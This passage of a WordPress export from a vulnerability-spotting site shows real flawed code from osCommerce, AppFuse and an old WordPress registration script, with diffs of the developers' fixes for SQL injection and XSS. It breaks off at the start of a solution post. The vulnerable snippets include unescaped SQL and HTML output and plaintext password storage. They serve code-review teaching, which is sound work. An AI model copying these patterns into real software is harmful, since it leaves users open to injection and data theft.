			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>424</wp:comment_id>
			<wp:comment_author><![CDATA[spotthevuln.com&raquo; Vulnerable Source Code &#8211; Misunderstood &#8211; SQLi ~ spotthevuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/03/misunderstood-sqli/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-03-12 11:15:26</wp:comment_date>
			<wp:comment_date_gmt>2010-03-12 18:15:26</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Original Code: Found Here [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Misunderstood - SQL Injection</title>
		<link>http://spotthevuln.com/2010/03/misunderstood-sqli/</link>
		<pubDate>Fri, 12 Mar 2010 18:15:19 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=725</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: OSCommerce2

Fixed in Version:

Issue Type: <a href="http://spotthevuln.com/category/vulnerability/sql-injection/">SQL Injection</a>

Original Code: <a title="Paid" href="http://spotthevuln.com/2010/03/misunderstood/" target="_blank">Found Here</a>
<h2>Description</h2>
Implementation bug here, leading to SQL injection.  The primary change involves the changing of a regular expression.  The initial check seemed be an attempt to validate data, but was too loose.  The data that slipped through validation eventually makes its way into a dynamically built SQL statement, resulting in SQL injection.

The Regular Expression is tightened up and some of the SQL statement was changed.  It’s interesting that the developers chose to implement better regular expression checking instead of trying to move this particular SQL statement to a prepared statement.
<h2>Developers Solution</h2>
[cce lang="diff"]

// show the products of a specified manufacturer

if (isset($HTTP_GET_VARS['manufacturers_id'])) {

if (isset($HTTP_GET_VARS['filter_id']) &amp;&amp; tep_not_null($HTTP_GET_VARS['filter_id'])) {

// We are asked to show only a specific category

$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS . " p left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_MANUFACTURERS . " m, " . TABLE_PRODUCTS_TO_CATEGORIES . " p2c where p.products_status = '1' and p.manufacturers_id = m.manufacturers_id and m.manufacturers_id = '" . (int)$HTTP_GET_VARS['manufacturers_id'] . "' and p.products_id = p2c.products_id and pd.products_id = p2c.products_id and pd.language_id = '" . (int)$languages_id . "' and p2c.categories_id = '" . (int)$HTTP_GET_VARS['filter_id'] . "'";

} else {

// We show them all

$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS . " p left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_MANUFACTURERS . " m where p.products_status = '1' and pd.products_id = p.products_id and pd.language_id = '" . (int)$languages_id . "' and p.manufacturers_id = m.manufacturers_id and m.manufacturers_id = '" . (int)$HTTP_GET_VARS['manufacturers_id'] . "'";

}

} else {

// show the products in a given categorie

if (isset($HTTP_GET_VARS['filter_id']) &amp;&amp; tep_not_null($HTTP_GET_VARS['filter_id'])) {

// We are asked to show only specific catgeory

$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS . " p left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_MANUFACTURERS . " m, " . TABLE_PRODUCTS_TO_CATEGORIES . " p2c where p.products_status = '1' and p.manufacturers_id = m.manufacturers_id and m.manufacturers_id = '" . (int)$HTTP_GET_VARS['filter_id'] . "' and p.products_id = p2c.products_id and pd.products_id = p2c.products_id and pd.language_id = '" . (int)$languages_id . "' and p2c.categories_id = '" . (int)$current_category_id . "'";

} else {

// We show them all

$listing_sql = "select " . $select_column_list . " p.products_id, p.manufacturers_id, p.products_price, p.products_tax_class_id, IF(s.status, s.specials_new_products_price, NULL) as specials_new_products_price, IF(s.status, s.specials_new_products_price, p.products_price) as final_price from " . TABLE_PRODUCTS_DESCRIPTION . " pd, " . TABLE_PRODUCTS . " p left join " . TABLE_MANUFACTURERS . " m on p.manufacturers_id = m.manufacturers_id left join " . TABLE_SPECIALS . " s on p.products_id = s.products_id, " . TABLE_PRODUCTS_TO_CATEGORIES . " p2c where p.products_status = '1' and p.products_id = p2c.products_id and pd.products_id = p2c.products_id and pd.language_id = '" . (int)$languages_id . "' and p2c.categories_id = '" . (int)$current_category_id . "'";

}

}

-    if ( (!isset($HTTP_GET_VARS['sort'])) || (!ereg('[1-8][ad]', $HTTP_GET_VARS['sort'])) || (substr($HTTP_GET_VARS['sort'], 0, 1) &gt; sizeof($column_list)) ) {

+    if ( (!isset($HTTP_GET_VARS['sort'])) || (!preg_match('/^[1-8][ad]$/', $HTTP_GET_VARS['sort'])) || (substr($HTTP_GET_VARS['sort'], 0, 1) &gt; sizeof($column_list)) ) {

for ($i=0, $n=sizeof($column_list); $i&lt;$n; $i++) {

if ($column_list[$i] == 'PRODUCT_LIST_NAME') {

$HTTP_GET_VARS['sort'] = $i+1 . 'a';

+          $listing_sql .= " order by pd.products_name";

+          break;

+        }

+      }

} else {

$sort_col = substr($HTTP_GET_VARS['sort'], 0 , 1);

$sort_order = substr($HTTP_GET_VARS['sort'], 1);

-     $listing_sql .= ' order by ';

switch ($column_list[$sort_col-1]) {

case 'PRODUCT_LIST_MODEL':

+         $listing_sql .= " order by p.products_model " . ($sort_order == 'd' ? 'desc' : '') . ", pd.products_name";

-         $listing_sql .= "p.products_model " . ($sort_order == 'd' ? 'desc' : '') . ", pd.products_name";

break;

case 'PRODUCT_LIST_NAME':

$listing_sql .= " order by pd.products_name " . ($sort_order == 'd' ? 'desc' : '');

break;

case 'PRODUCT_LIST_MANUFACTURER':

$listing_sql .= " order by m.manufacturers_name " . ($sort_order == 'd' ? 'desc' : '') . ", pd.products_name";

break;

case 'PRODUCT_LIST_QUANTITY':

$listing_sql .= " order by p.products_quantity " . ($sort_order == 'd' ? 'desc' : '') . ", pd.products_name";

break;

case 'PRODUCT_LIST_IMAGE':

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>725</wp:post_id>
		<wp:post_date>2010-03-12 11:15:19</wp:post_date>
		<wp:post_date_gmt>2010-03-12 18:15:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>misunderstood-sqli</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="oscommerce"><![CDATA[OSCommerce]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[523502cdb14df03e2f2250b2c4ec1e02]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9rWaml]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Misunderstood - SQLi]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Misunderstood - SQLi]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[SQL injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Karate</title>
		<link>http://spotthevuln.com/2010/03/karate/</link>
		<pubDate>Mon, 15 Mar 2010 15:00:56 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=728</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Karate is a form of martial arts in which people who have had years and years of training can, using only their hands and feet, make some of the worst movies in the history of the world.</strong><strong>
- Dave Berry
</strong></blockquote>
Hint:  Template Language

[ccnLe_java]

&lt;title&gt;${rc.getMessage("userList.title")}&lt;/title&gt;

&lt;button onclick="location.href='userform.html'"style="float: right; margin-top: -30px; width: 100px"&gt;Add User&lt;/button&gt;

&lt;table class="table" id="userList"&gt;

&lt;thead&gt;

&lt;tr&gt;

&lt;th&gt;${rc.getMessage("user.id")}&lt;/th&gt;

&lt;th&gt;${rc.getMessage("user.firstName")}&lt;/th&gt;

&lt;th&gt;${rc.getMessage("user.lastName")}&lt;/th&gt;

&lt;th&gt;${rc.getMessage("user.birthday")}&lt;/th&gt;

&lt;/tr&gt;

&lt;/thead&gt;

&lt;tbody&gt;

&lt;#list userList as user&gt;

&lt;#if user_index % 2 == 0&gt; &lt;tr class="odd"&gt;

&lt;#else&gt; &lt;tr class="even"&gt;

&lt;/#if&gt;

&lt;td&gt;&lt;a href="userform.html?id=${user.id}"&gt;${user.id}&lt;/a&gt;&lt;/td&gt;

&lt;td&gt;${user.firstName}&lt;/td&gt;

&lt;td&gt;${user.lastName}&lt;/td&gt;

&lt;td&gt;&lt;#if user.birthday??&gt;${user.birthday?date}&lt;/#if&gt;&lt;/td&gt;

&lt;/tr&gt;

&lt;/#list&gt;

&lt;/tbody&gt;

&lt;/table&gt;

&lt;script type="text/javascript"&gt;highlightTableRows("userList");&lt;/script

[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>728</wp:post_id>
		<wp:post_date>2010-03-15 08:00:56</wp:post_date>
		<wp:post_date_gmt>2010-03-15 15:00:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>karate</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Karate]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Karate]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Karate]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[fd195b3dc9050c558963443c5361ca8a]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aGzi7F]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>427</wp:comment_id>
			<wp:comment_author><![CDATA[Karate &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/03/karate-xss/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-03-19 08:05:51</wp:comment_date>
			<wp:comment_date_gmt>2010-03-19 15:05:51</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Karate &raquo;  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Karate – XSS</title>
		<link>http://spotthevuln.com/2010/03/karate-xss/</link>
		<pubDate>Fri, 19 Mar 2010 15:00:04 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=733</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Appfuse

Fixed in Version: 1.8.1

Issue Type: Cross Site Scripting

Original Code: <a title="Karate" href="http://spotthevuln.com/2010/03/karate/" target="_blank">Found  Here</a>
<h2>Description</h2>
Auditing template languages can be tricky.  Many times the tools and automation fall apart when dealing with template languages.  Also, many template languages separate markup and logic, forcing the code auditor to trace every alteration of markup.

In this specific example, we see that the developer has removed two lines that echoed the user’s firstname and lastname to the HTML markup.  The removed lines were replaced with what appears to be encoded firstname and lastname values.  What’s interesting is the birthdate and userid appear to be displayed without any encoding.  It would be interesting to see if the user/attacker could control these in a manner that could result in XSS.
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;title&gt;${rc.getMessage("userList.title")}&lt;/title&gt;

&lt;button onclick="location.href='userform.html'"style="float: right; margin-top: -30px; width: 100px"&gt;Add User&lt;/button&gt;

&lt;table class="table" id="userList"&gt;

&lt;thead&gt;

&lt;tr&gt;

&lt;th&gt;${rc.getMessage("user.id")}&lt;/th&gt;

&lt;th&gt;${rc.getMessage("user.firstName")}&lt;/th&gt;

&lt;th&gt;${rc.getMessage("user.lastName")}&lt;/th&gt;

&lt;th&gt;${rc.getMessage("user.birthday")}&lt;/th&gt;

&lt;/tr&gt;

&lt;/thead&gt;

&lt;tbody&gt;

&lt;#list userList as user&gt;

&lt;#if user_index % 2 == 0&gt; &lt;tr class="odd"&gt;

&lt;#else&gt; &lt;tr class="even"&gt;

&lt;/#if&gt;

&lt;td&gt;&lt;a href="userform.html?id=${user.id}"&gt;${user.id}&lt;/a&gt;&lt;/td&gt;

-    &lt;td&gt;${user.firstName}&lt;/td&gt;

-    &lt;td&gt;${user.lastName}&lt;/td&gt;

+    &lt;td&gt;${user.firstName?html}&lt;/td&gt;

+    &lt;td&gt;${user.lastName?html}&lt;/td&gt;

&lt;td&gt;&lt;#if user.birthday??&gt;${user.birthday?date}&lt;/#if&gt;&lt;/td&gt;

&lt;/tr&gt;

&lt;/#list&gt;

&lt;/tbody&gt;

&lt;/table&gt;

&lt;script type="text/javascript"&gt;highlightTableRows("userList");&lt;/script

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>733</wp:post_id>
		<wp:post_date>2010-03-19 08:00:04</wp:post_date>
		<wp:post_date_gmt>2010-03-19 15:00:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>karate-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appfuse"><![CDATA[AppFuse]]></category>
		<category domain="post_tag" nicename="appfuse"><![CDATA[AppFuse]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="template"><![CDATA[template]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Karate - XSS]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[on]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Karate - XSS]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[98889b87f94e89f9dbc0b32137fea21b]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/d4sBIP]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>428</wp:comment_id>
			<wp:comment_author><![CDATA[Sébastien Duquette]]></wp:comment_author>
			<wp:comment_author_email>ekse.0x@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://solution-36.blogspot.com</wp:comment_author_url>
			<wp:comment_author_IP>65.93.128.20</wp:comment_author_IP>
			<wp:comment_date>2010-03-19 17:08:47</wp:comment_date>
			<wp:comment_date_gmt>2010-03-20 00:08:47</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Thanks for the new blog template, it makes it much easier to read the code.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Three Days</title>
		<link>http://spotthevuln.com/2010/03/three-days/</link>
		<pubDate>Mon, 22 Mar 2010 15:00:51 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=765</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>For three days after death, hair and fingernails continue to grow but phone calls taper off</strong><strong>.</strong><strong>
- Johnny Carson
</strong></blockquote>
[ccnLe_php]

$user_login = $HTTP_POST_VARS['user_login'];
$pass1 = $HTTP_POST_VARS['pass1'];
$pass2 = $HTTP_POST_VARS['pass2'];
$user_email = $HTTP_POST_VARS['user_email'];

/* checking login has been typed */
if ($user_login == '') {
die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please enter a login.');
}

/* checking the password has been typed twice */
if ($pass1 == '' || $pass2 == '') {
die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please enter your password twice.');
}

/* checking the password has been typed twice the same */
if ($pass1 != $pass2)    {
die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please type the same password in the two password fields.');
}
$user_nickname = $user_login;

/* checking e-mail address */
if ($user_email == '') {
die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Please type your e-mail address.');
} else if (!is_email($user_email)) {
die ('&lt;strong&gt;ERROR&lt;/strong&gt;: The email address isn\'t correct.');
}

/* checking the login isn't already used by another user */
$result = $wpdb-&gt;get_results("SELECT user_login FROM $tableusers WHERE user_login = '$user_login'");
if (count($result) &gt;= 1) {
die ('&lt;strong&gt;ERROR&lt;/strong&gt;: This login is already registered, please choose another one.');
}

$user_ip = $HTTP_SERVER_VARS['REMOTE_ADDR'] ;
$user_domain = gethostbyaddr($HTTP_SERVER_VARS['REMOTE_ADDR'] );
$user_browser = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];

$user_login = addslashes($user_login);
$pass1 = addslashes($pass1);
$user_nickname = addslashes($user_nickname);
$now = current_time('mysql');

$result = $wpdb-&gt;query("INSERT INTO $tableusers
(user_login, user_pass, user_nickname, user_email, user_ip, user_domain, user_browser, dateYMDhour, user_level, user_idmode)
VALUES
('$user_login', '$pass1', '$user_nickname', '$user_email', '$user_ip', '$user_domain', '$user_browser', '$now', '$new_users_can_blog', 'nickname')");

if ($result == false) {
die ('&lt;strong&gt;ERROR&lt;/strong&gt;: Couldn\'t register you... please contact the &lt;a href="mailto:'.$admin_email.'"&gt;webmaster&lt;/a&gt; !');
}

$stars = '';
for ($i = 0; $i &lt; strlen($pass1); $i = $i + 1) {
$stars .= '*';
}

$message  = "New user registration on your blog $blogname:\r\n\r\n";
$message .= "Login: $user_login\r\n\r\nE-mail: $user_email";

@mail($admin_email, "[$blogname] New User Registration", $message);

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>765</wp:post_id>
		<wp:post_date>2010-03-22 08:00:51</wp:post_date>
		<wp:post_date_gmt>2010-03-22 15:00:51</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>three-days</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Three Days]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Three Days]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[08fc77e0a7174347a6d45f421aa9a63f]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cB7Rjb]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>431</wp:comment_id>
			<wp:comment_author><![CDATA[Sébastien Duquette]]></wp:comment_author>
			<wp:comment_author_email>ekse.0x@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://solution-36.blogspot.com</wp:comment_author_url>
			<wp:comment_author_IP>75.119.226.6</wp:comment_author_IP>
			<wp:comment_date>2010-03-22 17:39:39</wp:comment_date>
			<wp:comment_date_gmt>2010-03-23 00:39:39</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I see problems on two lines, but one is funnier than the other. Never trust user input, wherever it comes from...]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>432</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Three Days &#8211; Defense in Depth ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/03/three-days-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-03-26 13:46:51</wp:comment_date>
			<wp:comment_date_gmt>2010-03-26 20:46:51</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Three Days [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Three Days – Defense in Depth</title>
		<link>http://spotthevuln.com/2010/03/three-days-defense-in-depth/</link>
		<pubDate>Fri, 26 Mar 2010 20:46:45 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=773</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress

Fixed in Version: 2.8.4

Issue Type: Defense in Depth

